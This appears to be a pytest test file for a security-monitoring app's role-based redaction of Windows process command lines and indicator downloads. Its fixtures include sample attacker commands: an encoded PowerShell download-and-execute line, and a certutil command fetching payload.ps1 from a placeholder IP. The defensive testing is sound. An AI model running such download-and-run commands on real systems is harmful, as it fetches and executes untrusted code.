"""Viewers get command lines redacted server-side; analysts and admins see them in full."""

import json

import pytest

from app.auth.redaction import REDACTED, TextRedactor, process_name, redact_command
from app.models import Event

COLLECTOR = {"X-Collector-Key": "test-collector-key"}
PAYLOAD = "SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACkA"
URL = "http://203.0.113.10/payload.ps1"
CMD = f"powershell.exe -NoProfile -EncodedCommand {PAYLOAD}"
PS = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"

BASE = {
    "source": "agent", "host": "HOST-R", "channel": "Security", "provider": "Microsoft-Windows-Security-Auditing",
    "event_id": 4688, "user": "alice", "parent_process": "C:\\Windows\\System32\\cmd.exe",
    "src_ip": None, "logon_type": None, "raw": "{}",
}


def _login(client, role):
    pw = {"admin": "TestAdminPass123!", "analyst": "TestAnalystPass123!", "viewer": "TestViewerPass123!"}[role]
    token = client.post("/api/auth/login", json={"username": f"test_{role}", "password": pw}).json()["access_token"]
    return {"Authorization": f"Bearer {token}"}


@pytest.fixture()
def seeded(client, seed_users):
    events = [
        {**BASE, "id": "r0000000-0000-0000-0000-000000000000", "timestamp": "2026-10-21T05:01:00+00:00",
         "process": PS, "command_line": CMD, "message": f"A new process has been created.\nProcess Command Line: {CMD}"},
    ]
    # Ordinary process events: training data for the anomaly model.
    for i in range(1, 13):
        events.append({**BASE, "id": f"r000000{i:x}-0000-0000-0000-000000000001", "timestamp": f"2026-10-21T04:{i:02d}:00+00:00",
                       "process": "C:\\Windows\\System32\\notepad.exe", "command_line": f"notepad.exe C:\\Users\\alice\\notes{i}.txt",
                       "message": "A new process has been created."})
    assert client.post("/api/events/ingest", json={"events": events}, headers=COLLECTOR).status_code == 201
    analyst = _login(client, "analyst")
    incident_id = client.get("/api/incidents", headers=analyst).json()[0]["id"]
    assert client.post(f"/api/incidents/{incident_id}/investigate", headers=analyst).status_code == 200
    return {"incident_id": incident_id, "analyst": analyst, "viewer": _login(client, "viewer"), "admin": _login(client, "admin")}


def _text(resp) -> str:
    assert resp.status_code == 200, resp.status_code
    return json.dumps(resp.json())


# ---------- unit ----------


def test_redact_command_keeps_only_the_process_name():
    assert redact_command(CMD, PS) == f"powershell.exe {REDACTED}"
    assert redact_command(CMD, None) == f"powershell.exe {REDACTED}"  # name taken from the command line
    assert redact_command(None, PS) is None
    assert process_name('"C:\\Program Files\\x\\tool.exe"') == "tool.exe"


def test_text_redactor_masks_full_commands_and_long_arguments():
    event = Event(id="e1", command_line=f"certutil.exe -urlcache -f {URL} C:\\Users\\Public\\p.ps1",
                  process="C:\\Windows\\System32\\certutil.exe")
    r = TextRedactor([event])
    assert r.text(f"ran {event.command_line} then") == f"ran certutil.exe {REDACTED} then"
    # An AI narrative that quotes only part of the command still loses the URL and path.
    partial = r.text(f"It downloaded {URL} to C:\\Users\\Public\\p.ps1 with certutil.exe")
    assert URL not in partial and "p.ps1" not in partial and "certutil.exe" in partial
    assert r.apply({"a": [f"x {URL}"], "n": 3}) == {"a": ["x [redacted]"], "n": 3}


# ---------- routes ----------


def test_events_viewer_redacted_analyst_full(client, seeded):
    url = "/api/events?event_id=4688&q=EncodedCommand"
    viewer = client.get(url, headers=seeded["viewer"]).json()["items"][0]
    assert viewer["command_line"] == f"powershell.exe {REDACTED}"
    assert PAYLOAD not in viewer["message"] and viewer["process"] == PS
    analyst = client.get(url, headers=seeded["analyst"]).json()["items"][0]
    assert analyst["command_line"] == CMD and PAYLOAD in analyst["message"]


def test_anomalies_viewer_redacted_analyst_full(client, seeded):
    viewer = client.get("/api/anomalies?limit=50", headers=seeded["viewer"]).json()["items"]
    assert viewer and all(i["command_line"].endswith(REDACTED) for i in viewer)
    analyst = client.get("/api/anomalies?limit=50", headers=seeded["analyst"]).json()["items"]
    assert CMD in {i["command_line"] for i in analyst}


def test_investigation_viewer_redacted_analyst_full(client, seeded):
    url = f"/api/incidents/{seeded['incident_id']}/investigate"
    assert PAYLOAD in _text(client.get(url, headers=seeded["analyst"]))  # so the viewer check is meaningful
    viewer = _text(client.get(url, headers=seeded["viewer"]))
    assert PAYLOAD not in viewer and REDACTED in viewer


def test_report_viewer_redacted_and_without_iocs(client, seeded):
    url = f"/api/incidents/{seeded['incident_id']}/report"
    analyst = client.get(url, headers=seeded["analyst"]).json()
    assert PAYLOAD in json.dumps(analyst) and analyst["iocs"]
    viewer = client.get(url, headers=seeded["viewer"]).json()
    assert PAYLOAD not in json.dumps(viewer)
    assert viewer["iocs"] == []
    assert viewer["incident"]["id"] == seeded["incident_id"]  # the rest of the report is intact


def test_graph_viewer_has_no_command_lines(client, seeded):
    url = f"/api/incidents/{seeded['incident_id']}/graph"
    assert PAYLOAD not in _text(client.get(url, headers=seeded["viewer"]))


def test_ioc_downloads_are_analyst_plus(client, seeded):
    url = f"/api/incidents/{seeded['incident_id']}/iocs"
    assert client.get(url, headers=seeded["viewer"]).status_code == 403
    assert client.get(url + "?format=csv", headers=seeded["viewer"]).status_code == 403
    assert client.get(url, headers=seeded["analyst"]).status_code == 200
    assert client.get(url + "?format=csv", headers=seeded["admin"]).status_code == 200
